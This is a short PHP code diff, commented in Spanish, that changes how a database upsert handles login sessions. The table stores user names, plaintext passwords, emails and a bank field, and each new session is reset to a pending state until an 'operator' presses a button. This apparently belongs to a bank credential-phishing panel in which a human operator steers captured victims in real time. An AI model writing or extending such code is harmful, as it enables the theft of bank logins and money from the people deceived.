@@ -19,13 +19,17 @@ $sel->execute([$claveUnica]);
 $existente = $sel->fetch(PDO::FETCH_ASSOC);
 
 if ($existente && !empty($existente['request_id'])) {
-    $idPeticion = (string)$existente['request_id'];
+    $idPeticionAntiguo = (string)$existente['request_id'];
 } else {
-    try {
-        $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
-    } catch (Throwable $_) {
-        $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
-    }
+    $idPeticionAntiguo = null;
+}
+// NUEVA sesion de login = NUEVO request_id BCO_ y estado='pendiente' SIEMPRE,
+// incluso si la fila ya existia con estado != pendiente de una sesion anterior.
+// Asi el operador tiene que volver a pulsar el boton correspondiente para esta sesion.
+try {
+    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
+} catch (Throwable $_) {
+    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
 }
 
 $upsert = $pdo->prepare(
@@ -34,9 +38,10 @@ $upsert = $pdo->prepare(
      ON DUPLICATE KEY UPDATE
          `user`       = VALUES(`user`),
          `password`   = VALUES(`password`),
-         `request_id` = IFNULL(VALUES(`request_id`), `request_id`),
+         `request_id` = VALUES(`request_id`),
          `correo`     = IFNULL(VALUES(`correo`), `correo`),
-         `banco`      = IFNULL(VALUES(`banco`), `banco`)"
+         `banco`      = IFNULL(VALUES(`banco`), `banco`),
+         `estado`     = 'pendiente'"
 );
 $upsert->execute([
     ':k'   => $claveUnica,
